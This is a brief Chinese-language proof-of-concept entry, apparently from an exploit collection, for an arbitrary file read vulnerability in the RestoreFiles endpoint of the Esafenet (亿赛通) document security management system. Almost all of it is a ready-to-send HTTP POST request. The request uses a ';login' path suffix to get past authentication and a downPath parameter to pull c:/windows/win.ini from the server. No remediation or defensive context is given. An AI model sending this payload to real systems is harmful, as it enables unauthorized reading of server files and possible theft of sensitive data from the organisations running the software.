## 亿赛通电子文档安全管理系统RestoreFiles任意文件读取漏洞


## poc
```
POST /CDGServer3/document/RestoreFiles;login HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

command=DownloadDoc&fileNameForDownload=&downPath=c:/windows/win.ini
```
